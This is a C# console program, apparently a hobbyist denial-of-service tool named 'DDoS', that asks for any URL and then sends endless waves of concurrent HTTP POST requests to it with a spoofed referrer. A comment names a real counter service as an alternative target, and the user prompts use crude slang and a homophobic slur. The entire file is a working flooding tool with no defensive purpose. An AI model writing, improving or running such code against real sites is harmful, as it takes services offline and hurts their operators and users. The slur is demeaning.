using System;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace DDoS
{
    class Program
    {
        private static readonly HttpClient client = new HttpClient();
        static string url = "";
        static int count = 0;

        static async Task SendHTTP()
        {
            try
            {
                // Create the request
                var request = new HttpRequestMessage(HttpMethod.Post, url); // or https://incr.easrng.net/badge?key=dedigger

                // Add headers
                request.Headers.Add("skibidi", "Hello from France!");
                request.Headers.Referrer = new Uri(url);

                // Set the content of the request (with the correct Content-Type header)
                request.Content = new StringContent("", System.Text.Encoding.UTF8, "text/plain");

                // Send the request
                HttpResponseMessage response = await client.SendAsync(request);
                count += 1;

                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write($"\n[#{count.ToString()} {response.StatusCode.ToString()}]:");
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.Write(" Message sent");

            }
            catch (Exception e)
            {
                Console.WriteLine($"Exception: {e.Message}");
            }
        }

        static bool IsValidUrl(string url)
        {
            return Uri.TryCreate(url, UriKind.Absolute, out Uri uriResult)
                   && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
        }


        static async Task Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine(@"╔═════════════════════════════════════════════════════════════════════════╗
║ ██████╗░███████╗░█████╗░████████╗  ███╗░░░███╗███████╗░█████╗░████████╗ ║
║ ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝  ████╗░████║██╔════╝██╔══██╗╚══██╔══╝ ║
║ ██████╦╝█████╗░░███████║░░░██║░░░  ██╔████╔██║█████╗░░███████║░░░██║░░░ ║
║ ██╔══██╗██╔══╝░░██╔══██║░░░██║░░░  ██║╚██╔╝██║██╔══╝░░██╔══██║░░░██║░░░ ║
║ ██████╦╝███████╗██║░░██║░░░██║░░░  ██║░╚═╝░██║███████╗██║░░██║░░░██║░░░ ║
║ ╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░  ╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚═╝░░░╚═╝░░░ ║
╚═════════════════════════════════════════════════════════════════════════╝
");

            string link;
            while (true) {
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.Write("give link or gay: ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                string response = Console.ReadLine();
                if (IsValidUrl(response)) {
                    link = response;
                    break;
                } else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write("bruh ts pmo my sigma icl pls lock in n gimme smth da bonkers url \n");
                }
            }

            int taskCount;
            while (true) {
                Console.ForegroundColor = ConsoleColor.Magenta;
                Console.Write("how many requests per task: ");
                Console.ForegroundColor = ConsoleColor.Cyan;
                string response = Console.ReadLine();
                if (int.TryParse(response, out taskCount) && taskCount>0)
                {
                    break;
                } else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.Write("bruh ts pmo my sigma icl pls lock in n gimme a num more skibidi fr (i aint askin' 4 ur phone num xDDD LOL)\n");
                }
            }
            
            url = link;

            var tasks = new Task[taskCount]; // send 100 requests at once
            while (true)
            {
                for (int i = 0; i < tasks.Length; i++)
                {
                    tasks[i] = SendHTTP();
                }
                await Task.WhenAll(tasks); // wait for all to finish before doing another wave
            }
        }
    }
}